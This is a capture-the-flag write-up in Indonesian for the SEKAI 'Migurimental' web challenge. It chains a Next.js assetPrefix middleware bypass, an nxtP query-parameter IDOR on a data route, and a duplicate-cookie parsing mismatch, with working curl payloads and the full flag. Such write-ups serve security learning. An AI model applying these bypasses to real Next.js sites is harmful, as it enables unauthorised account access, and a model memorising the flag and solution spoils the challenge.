# Migurimental

## Ringkas

Exploit chain-nya ada dua bagian:

1. `backstage2` bisa dibypass lewat `assetPrefix` sehingga route data `/_next/data/.../index.json` tetap ngerender halaman `/` tanpa kena middleware.
2. `backstage1` punya dua bug yang bisa dirangkai:
   - data route `/access-card` bisa dibuka untuk user lain lewat query `nxtPid=<our_id>&id=1`
   - `/backroom` punya parser cookie beda antara middleware Edge dan SSR Node, jadi duplicate cookie `ticket_uuid` bisa dipakai buat lolos check middleware tapi tetap ngebaca UUID milik miku di SSR

Hasil akhirnya:

`SEKAI{7h3_l33k_15_b4ck_7h3_cr0wd_15_ch33r1ng_4nd_7h3_c0nc3r7_c4n_f1n4lly_b3g1n_m1ku_m1ku_b34mmmmmmmmmmmm}`

## Analisis

### 1. Half kedua flag dari `migurimental-2`

`apps/backstage2/next.config.js` set `assetPrefix: '/cdn'`.

Middleware app kedua cuma match route `/`, tapi request ke:

```text
/cdn/_next/data/<buildId>/index.json
```

tetap direwrite ke data route halaman index dan ngerender HTML halaman `/`.

Request:

```bash
curl -sk https://migurimental-2.chals.sekai.team/cdn/_next/data/nRVcVzPJ7U21AcMTs21fY/index.json
```

Dari HTML response, bagian ini keluar:

```text
c0nc3r7_c4n_f1n4lly_b3g1n_m1ku_m1ku_b34mmmmmmmmmmmm}
```

### 2. Leak QR miku dari `migurimental`

Route `/access-card` dijaga middleware ini:

```js
if (pathname === '/access-card') {
  return request.nextUrl.searchParams.get('id') === session.sub
}
```

Di sisi SSR, halaman pakai:

```js
const user = await findById(query.id)
```

Masalahnya ada di data route Next.js. Query key dengan prefix `nxtP` dinormalisasi jadi key biasa sebelum SSR, tapi middleware tetap ngelihat kombinasi query yang bikin check `id === session.sub` lolos.

Payload yang jalan:

```text
/_next/data/<buildId>/access-card.json?nxtPid=<our_id>&id=1
```

Efeknya:

- middleware anggap request ini punya `id=<our_id>`
- SSR `getServerSideProps` malah resolve user `id=1`

Jadi kita bisa ambil `pageProps` milik miku, termasuk `qrDataUrl`.

### 3. Ambil `ticket_uuid` miku dari QR

JSON dari data route tadi berisi PNG QR dalam format data URL.

Decode QR:

```bash
zbarimg --quiet --raw /tmp/miku_qr.png
```

Output yang saya dapat saat solve:

```text
0464e4c2-2700-4e36-8401-597482a41ac7
```

Itu `ticket_uuid` milik miku.

### 4. Bypass `/backroom` pakai duplicate cookie

Middleware `/backroom` cek:

```js
request.cookies.get('ticket_uuid')?.value === session.ticketUuid
```

SSR Node di `pages/backroom.js` baca:

```js
const ticketUuid = req.cookies.ticket_uuid
const ticketUser = await findByTicketUuid(ticketUuid)
```

Parser cookie Edge dan Node beda:

- middleware Edge ambil cookie duplicate yang terakhir
- SSR Node ambil cookie duplicate yang pertama

Jadi kirim:

```text
Cookie: session=<our_jwt>; ticket_uuid=<miku_uuid>; ticket_uuid=<our_uuid>
```

Efeknya:

- middleware baca `ticket_uuid=<our_uuid>` lalu lolos
- SSR baca `ticket_uuid=<miku_uuid>` lalu load user id `1`
- halaman `/backroom` ngerender half pertama flag

Response ngasih:

```text
SEKAI{7h3_l33k_15_b4ck_7h3_cr0wd_15_ch33r1ng_4nd_7h3_
```

## Langkah Eksploitasi

### Step 1 - Register user biasa

```bash
curl -sk -X POST \
  -d 'username=solve123&password=SuperPass123' \
  -D headers.txt \
  https://migurimental.chals.sekai.team/api/register
```

Simpan:

- `session`
- `ticket_uuid`
- `id` dari redirect `/access-card?id=<our_id>`

### Step 2 - Ambil access card milik miku via data route

```bash
curl -sk \
  -H 'Cookie: session=<our_session>; ticket_uuid=<our_uuid>' \
  'https://migurimental.chals.sekai.team/_next/data/3_SEgyxks-2tgaI5l4ILx/access-card.json?nxtPid=<our_id>&id=1'
```

JSON response berisi:

- `pageProps.user.id = 1`
- `pageProps.user.username = "miku"`
- `pageProps.qrDataUrl`

### Step 3 - Decode QR

```bash
python3 - <<'PY'
import json, base64
data = json.load(open('access-card.json'))
raw = data['pageProps']['qrDataUrl'].split(',', 1)[1]
open('/tmp/miku_qr.png', 'wb').write(base64.b64decode(raw))
PY

zbarimg --quiet --raw /tmp/miku_qr.png
```

### Step 4 - Ambil half pertama dari `/backroom`

```bash
curl -sk \
  -H 'Cookie: session=<our_session>; ticket_uuid=<miku_uuid>; ticket_uuid=<our_uuid>' \
  https://migurimental.chals.sekai.team/backroom
```

HTML response berisi:

```text
SEKAI{7h3_l33k_15_b4ck_7h3_cr0wd_15_ch33r1ng_4nd_7h3_
```

### Step 5 - Ambil half kedua dari `migurimental-2`

```bash
curl -sk https://migurimental-2.chals.sekai.team/cdn/_next/data/nRVcVzPJ7U21AcMTs21fY/index.json
```

HTML response berisi:

```text
c0nc3r7_c4n_f1n4lly_b3g1n_m1ku_m1ku_b34mmmmmmmmmmmm}
```

### Step 6 - Gabungkan

```text
SEKAI{7h3_l33k_15_b4ck_7h3_cr0wd_15_ch33r1ng_4nd_7h3_
+ c0nc3r7_c4n_f1n4lly_b3g1n_m1ku_m1ku_b34mmmmmmmmmmmm}
```

Final:

```text
SEKAI{7h3_l33k_15_b4ck_7h3_cr0wd_15_ch33r1ng_4nd_7h3_c0nc3r7_c4n_f1n4lly_b3g1n_m1ku_m1ku_b34mmmmmmmmmmmm}
```
